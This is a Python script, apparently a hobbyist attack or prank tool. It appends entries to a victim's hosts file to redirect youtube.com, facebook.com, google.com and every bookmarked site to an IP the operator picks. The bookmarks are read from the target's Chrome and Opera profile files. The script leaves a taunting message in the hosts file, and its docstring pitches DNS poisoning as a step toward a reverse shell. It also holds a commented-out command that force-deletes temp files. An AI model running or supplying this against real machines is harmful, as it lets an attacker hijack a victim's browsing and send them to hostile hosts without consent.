"""
A script that replaces the /etc/hosts file 
of the current operating system and redirects
common websites adresses to the appointed IP adress.

DNS poisoning can be used to redirect target hosts sites
that can be then used for reverse shell.

NOTE: It is necessary to clear cache so that browsers
sessions are cleared.
"""
import os
import sys
import re

ascii_art = """\n\n\n
#==============================================|
# /\_/\  Looks like you found out that I'm     |
#( o.o ) redirecting your sites hehe.             |
# > ^ <                                        |
#/  ~  \\                                       |
#==============================================|
\n\n\n
"""
ascii_art3 =f"""\n
  / \__             This tool blocks access from
 (    @\____        common websites and retrieve 
 /         O        bookmarks from the target PC 
/   (_____/         and blocks all websites from 
/_____/   U         those booksmarks. \n
"""


# Check the current OS, since every OS have different hosts 
# file destination.
if os.name == 'nt':
    dest = "c:\Windows\System32\Drivers\etc\hosts" 

else: 
    dest = "/etc/hosts"

User = os.getenv('USERNAME')

# List of bookmarks directory from different browsers and OS.
# You can add other bookmarks here.
bookmarks_dir = [
         f"C:/Users/{User}/AppData/Local/Google/Chrome/User Data/Default/Bookmarks",
         f"C:/Users/{User}/AppData/Roaming/Opera Software/Opera GX Stable/Bookmarks",
         f"C:/Users/{User}/AppData/Roaming/Opera Software/Opera Stable/Bookmarks",
         ]


# List of sites to block.
sites = ["youtube.com", "facebook.com", "messenger.com", "google.com"]


def getBooksmarksFile(bookmarks_dir) -> list:
    with open(bookmarks_dir, 'r') as f:
        file = f.read()
    return file

def getUrl(file: str) -> list:
    bookmarks = re.findall(r'"url":.*', file)
    for i in range(len(bookmarks)):
        bookmarks[i] = bookmarks[i].removeprefix('"url": ').strip('"')
    return bookmarks


def flushDNS() -> None:
    print(f"[*]INFO{BB}: Flushing DNS...")
    os.system("ipconfig/flushdns")
    print(f"[*]INFO: DNS successfully flushed.")

def clearTemp() -> None:
    print(f"[*]INFO: Deleting TEMP files...")
    files_num = len(os.listdir())
    os.system("del /q /f %temp%\\")
    deleted_files = files_num - len(os.listdir())
    print(f"[*]INFO: Deleted {deleted_files} TEMP files.")

def changeHosts(sites: list, ip_address: str) -> None:
    print(f"[*]INFO: Changing hosts file...")
    print(f"[*]INFO: Blocking sites...")
    with open(dest, 'a') as f:
        f.write(ascii_art)
 
    with open(dest, 'a') as f:
        f.write("# You can delete the redirected sites now lol \(o _ o)/\n\n")

    for site in sites:
        with open(dest, 'a') as f:
            f.write(f"{ip_address}    {site}\n")
            print(f"[*]INFO: www.{site} blocked.")

    print(f"[*]INFO: All sites have been blocked.")

def main():
    print("=" * 100)
    print(ascii_art3)
    print("=" * 100)
    print('\n\n')
    
    ip_address = input("[*]INFO: Enter the IP address you want to redirect (default 0.0.0.0): ")
    
    if ip_address == "":
            ip_address = '0.0.0.0'
            print(f"[*]INFO: No IP address provided using 0.0.0.0.")

    user_input = input(f"[*]INFO: Do you also want to include sites from the bookmarks? ")
    
    if user_input.lower() in ['y', 'yes']:
        print(f"[*]INFO: Finding bookmarks...")
        for bookmarks in bookmarks_dir:
            Booksmarks = []
            try:
                Booksmarks = getUrl(getBooksmarksFile(bookmarks))
            except FileNotFoundError:
                print(f"[*]WARNING: No bookmarks for {bookmarks}, continuing...")

            Booksmarksnum = len(Booksmarks)
            print(f"[*]INFO: Found {Booksmarksnum}.")
            print(f"[*]INFO: Adding the found bookmarks to the list to block...")
            sites.extend(Booksmarks)
    else:
        print(f"[*]INFO: Not including bookmarks.")

    try:
        #flushDNS()
        #clearTemp()
        pass
    except:
        print(f"[*]INFO: Cannot flush caches.")
        print(f"[*]INFO: Continuing...")

    try:
       changeHosts(sites, ip_address)
    except PermissionError:
        print(f"[*]INFO: You must run the script as admin.")
    input()
    print(f"[*]INFO: Exiting...")

if __name__ == "__main__":
    main()


